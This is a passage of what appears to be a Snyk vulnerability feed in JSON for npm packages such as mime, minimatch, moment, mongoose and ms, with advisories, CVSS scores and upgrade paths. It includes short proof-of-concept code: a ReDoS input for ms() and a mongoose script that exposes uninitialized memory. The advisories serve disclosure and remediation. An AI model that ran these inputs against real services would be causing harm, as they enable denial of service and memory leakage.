                  "upgrade_package": "0.3.18"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.3.18"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2018-02-27T15:06:27Z",
            "exploit": "Proof of Concept",
            "publication_time": "2018-02-27T16:32:24Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/pull/1083/commits/b15e42b67cec9ded8505e9d68bb8741ad7a9590d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/markedjs/marked/pull/1083",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:mime:20170907",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[mime](https://www.npmjs.com/package/mime) is a comprehensive, compact MIME type module.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It uses regex the following regex `/.*[\\.\\/\\\\]/` in its lookup, which can cause a slowdown of 2 seconds for 50k characters.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `mime` to version 1.4.1, 2.0.3 or higher.\n## References\n- [GitHub Commit](https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0)\n- [GitHub Commit](https://github.com/broofa/node-mime/commit/855d0c4b8b22e4a80b9401a81f2872058eae274d)\n- [GitHub Issue](https://github.com/broofa/node-mime/issues/167)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/535)\n",
        "created_at": "2017-09-26T05:48:40Z",
        "updated_at": "2024-03-11T09:53:48Z",
        "problems": [
          {
            "id": "CVE-2017-16138",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.4.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.4.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.4.1,>=2.0.0 <2.0.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2017-09-07T21:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-09-27T05:48:40Z",
            "references": [
              {
                "url": "https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/broofa/node-mime/commit/855d0c4b8b22e4a80b9401a81f2872058eae274d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/broofa/node-mime/issues/167",
                "title": "GitHub Issue"
              },
              {
                "url": "https://www.npmjs.com/advisories/535",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:minimatch:20160620",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n\n[minimatch](https://www.npmjs.com/package/minimatch) is a minimal matching utility.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS).\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `minimatch` to version 3.0.2 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/isaacs/minimatch/commit/6944abf9e0694bd22fd9dad293faa40c2bc8a955)\n",
        "created_at": "2016-06-20T16:00:06Z",
        "updated_at": "2024-03-11T09:46:35Z",
        "problems": [
          {
            "id": "CVE-2016-10540",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2016-06-20T15:52:52Z",
            "exploit": "Not Defined",
            "publication_time": "2016-06-20T15:52:52Z",
            "references": [
              {
                "url": "https://github.com/isaacs/minimatch/commit/6944abf9e0694bd22fd9dad293faa40c2bc8a955",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:moment:20161019",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\r\n[`moment`](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\r\n\r\nAffected versions of the package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks for any locale that has separate format and standalone options and `format` input can be controlled by the user.\r\n\r\nAn attacker can provide a specially crafted input to the `format` function, which nearly matches the pattern being matched. This will cause the regular expression matching to take a long time, all the while occupying the event loop and preventing it from processing other requests and making the server unavailable (a Denial of Service attack).\r\n\r\n## Disclosure Timeline\r\n- October 19th, 2016 - Reported the issue to package owner.\r\n- October 19th, 2016 - Issue acknowledged by package owner.\r\n- October 24th, 2016 - Issue fixed and version `2.15.2` released.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## References\r\n- [Proof of concept](https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc)\r\n- [Fix commit](https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9)",
        "created_at": "2016-10-23T06:57:59Z",
        "updated_at": "2024-03-06T14:03:33Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.15.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.15.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.15.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.9,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2016-10-18T21:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2016-10-24T06:57:59Z",
            "references": [
              {
                "url": "https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9",
                "title": "GitHub Commit"
              },
              {
                "url": "https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc",
                "title": "Proof of concept"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:moment:20170905",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (`/[0-9]*['a-z\\u00A0-\\u05FF\\u0700-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF]+|[\\u0600-\\u06FF\\/]+(\\s*?[\\u0600-\\u06FF]+){1,2}/i`) in order to parse dates specified as strings. This can cause a very low impact of about 2 seconds matching time for data 50k characters long.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `moment` to version 2.19.3 or higher.\n## References\n- [GitHub Issue](https://github.com/moment/moment/issues/4163)\n- [GitHub PR](https://github.com/moment/moment/pull/4326)\n",
        "created_at": "2017-09-13T07:55:05Z",
        "updated_at": "2024-03-11T09:54:00Z",
        "problems": [
          {
            "id": "CVE-2017-18214",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.19.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.19.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.19.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2017-09-05T21:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-11-28T14:47:22Z",
            "references": [
              {
                "url": "https://github.com/moment/moment/issues/4163",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/moment/moment/pull/4326",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:mongoose:20160116",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Remote Memory Exposure",
        "description": "## Overview\r\nA potential memory disclosure vulnerability exists in mongoose.\r\nA `Buffer` field in a MongoDB document can be used to expose sensitive\r\ninformation such as code, runtime memory and user data into MongoDB.\r\n\r\n## Details\r\nInitializing a `Buffer` field in a document with integer `N` creates a `Buffer`\r\nof length `N` with non zero-ed out memory.\r\n\r\n**Example:**\r\n```\r\nvar x = new Buffer(100); // uninitialized Buffer of length 100\r\n// vs\r\nvar x = new Buffer('100'); // initialized Buffer with value of '100'\r\n```\r\nInitializing a MongoDB document field in such manner will dump uninitialized\r\nmemory into MongoDB.\r\nThe patch wraps `Buffer` field initialization in mongoose by converting a\r\n`number` value `N` to array `[N]`, initializing the `Buffer` with `N` in its\r\nbinary form.\r\n\r\n## Proof of concept\r\n```javascript\r\nvar mongoose = require('mongoose');\r\nmongoose.connect('mongodb://localhost/bufftest');\r\n\r\n// data: Buffer is not uncommon, taken straight from the docs: http://mongoosejs.com/docs/schematypes.html\r\nmongoose.model('Item', new mongoose.Schema({id: String, data: Buffer}));\r\n\r\nvar Item = mongoose.model('Item');\r\n\r\nvar sample = new Item();\r\nsample.id = 'item1';\r\n\r\n// This will create an uninitialized buffer of size 100\r\nsample.data = 100;\r\nsample.save(function () {\r\n    Item.findOne(function (err, result) {\r\n        // Print out the data (exposed memory)\r\n        console.log(result.data.toString('ascii'))\r\n        mongoose.connection.db.dropDatabase(); // Clean up everything\r\n        process.exit();\r\n    });\r\n});\r\n```\n\n## References\n- [https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)\n- [https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md%23previous-materials](https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md%23previous-materials)\n- [https://github.com/Automattic/mongoose/issues/3764](https://github.com/Automattic/mongoose/issues/3764)\n",
        "created_at": "2016-01-23T12:00:05Z",
        "updated_at": "2024-03-06T14:03:35Z",
        "problems": [
          {
            "id": "CWE-201",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.8.39 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.8.39"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=3.5.5 <3.8.39,>=4.0.0 <4.3.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.1,
            "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2016-01-23T12:00:05Z",
            "exploit": "Functional",
            "publication_time": "2016-01-23T12:00:05Z",
            "references": [
              {
                "url": "https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md",
                "title": "Blog: Information about Buffer"
              },
              {
                "url": "https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md%23previous-materials",
                "title": "Blog: Node Buffer API fix"
              },
              {
                "url": "https://github.com/Automattic/mongoose/issues/3764",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:ms:20151024",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n\n[ms](https://www.npmjs.com/package/ms) is a tiny milisecond conversion utility.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\nattack when converting a time period string (i.e. `\"2 days\"`, `\"1h\"`) into a milliseconds integer. A malicious user could pass extremely long strings to `ms()`, causing the server to take a long time to process, subsequently blocking the event loop for that extended period.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `ms` to version 0.7.1 or higher.\n\n\n## References\n\n- [OSS security Advisory](https://www.openwall.com/lists/oss-security/2016/04/20/11)\n\n- [OWASP - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\n\n- [Security Focus](https://www.securityfocus.com/bid/96389)\n",
        "created_at": "2015-11-06T02:09:36Z",
        "updated_at": "2024-03-11T09:53:19Z",
        "problems": [
          {
            "id": "CVE-2015-8315",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.7.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.7.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.7.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2015-10-24T20:39:59Z",
            "exploit": "Not Defined",
            "publication_time": "2015-11-06T02:09:36Z",
            "references": [
              {
                "url": "https://www.openwall.com/lists/oss-security/2016/04/20/11",
                "title": "OSS security Advisory"
              },
              {
                "url": "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS",
                "title": "OWASP - ReDoS"
              },
              {
                "url": "https://www.securityfocus.com/bid/96389",
                "title": "Security Focus"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:ms:20170412",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\r\n[`ms`](https://www.npmjs.com/package/ms) is a tiny millisecond conversion utility.\r\n\r\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to an incomplete fix for previously reported vulnerability [npm:ms:20151024](https://snyk.io/vuln/npm:ms:20151024). The fix limited the length of accepted input string to 10,000 characters, and turned to be insufficient making it possible to block the event loop for 0.3 seconds (on a typical laptop) with a specially crafted string passed to `ms()` function.\r\n\r\n*Proof of concept*\r\n```js\r\nms = require('ms');\r\nms('1'.repeat(9998) + 'Q') // Takes about ~0.3s\r\n```\r\n\r\n**Note:** Snyk's patch for this vulnerability limits input length to 100 characters. This new limit was deemed to be a breaking change by the author.\r\nBased on user feedback, we believe the risk of breakage is _very_ low, while the value to your security is much greater, and therefore opted to still capture this change in a patch for earlier versions as well.  Whenever patching security issues, we always suggest to run tests on your code to validate that nothing has been broken.\r\n\r\nFor more information on `Regular Expression Denial 